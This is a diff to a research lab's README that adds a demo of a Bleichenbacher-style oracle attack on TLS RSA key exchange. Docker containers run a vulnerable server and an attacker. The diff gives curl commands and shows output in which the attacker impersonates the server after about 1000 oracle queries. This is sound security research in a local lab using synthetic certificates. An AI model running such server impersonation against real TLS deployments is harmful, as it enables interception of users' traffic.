@@ -47,6 +47,76 @@ and cleanup commands.
 Experiment results are generated locally under ignored output directories.
 The keys and certificates included here are synthetic lab fixtures.
 
+## Demo with curl
+Start the vulnerable server and attacker containers:
+
+```sh
+docker compose -f latency/docker-compose.yml -f latency/docker-compose.macos.yml up -d --build server attacker
+```
+
+Then start the attacker's TLS server in one terminal:
+
+```sh
+latency/examples/start_server.sh
+```
+
+In a second terminal, connect to the attacker through its published port. The
+`--resolve` option directs the name `server` to the attacker, while `--cacert`
+configures curl to trust only the lab CA:
+
+```sh
+curl --verbose --noproxy '*' \
+  --cacert latency/cert/ca.crt \
+  --resolve server:8443:127.0.0.1 \
+  --output /dev/null \
+  https://server:8443/
+```
+**Note:** The attack is probablistic and might fail on the first attempt. Then
+just restart `start_server.sh` and try `curl` again.
+
+The verbose curl output confirms that the attacker completes a TLS handshake
+as `server` with a certificate signed by the lab CA:
+
+```text
+* Server certificate:
+*  subject: CN=server
+*  issuer: CN=My Dev CA
+*  subjectAltName: host "server" matched cert's "server"
+*  SSL certificate verify ok.
+< HTTP/1.0 200 OK
+```
+
+At the same time, the attacker terminal shows the key-recovery queries and the
+successful request:
+
+```text
+latency/examples/start_server.sh
+I am an HTTP test server, I will listen on 0.0.0.0:443
+Serving files from /attacker/tlslite-ng-bleichenbacher
+About to handshake...
+1000 oracle queries
+  Handshake time: 2.608 seconds
+  Version: TLS 1.2
+  Cipher: aes128 python
+  Ciphersuite: TLS_RSA_WITH_AES_128_CBC_SHA256
+  No client certificate provided by peer
+  Server X.509 SHA1 fingerprint: 455d54302a5dbbbdbaa31aa442f900177012115d
+  SNI: server
+  Application Layer Protocol negotiated: http/1.1
+  Next-Protocol Negotiated: None
+  Encrypt-then-MAC: True
+  Extended Master Secret: True
+  Session Resumed: False
+  Session used ec point format extension: 0
+172.20.0.1 - - [27/Oct/2026 14:28:03] "GET / HTTP/1.1" 200 -
+```
+
+The number of oracle queries and the handshake time vary between runs. 
+
+Because curl connected to the `attacker` container but successfully verified
+the identity `server`, this demonstrates that the attacker impersonated the
+victim server.
+
 ## Credits
 
 The comparison attack builds on Livia Capol's 2021 work. Parts of the TLS
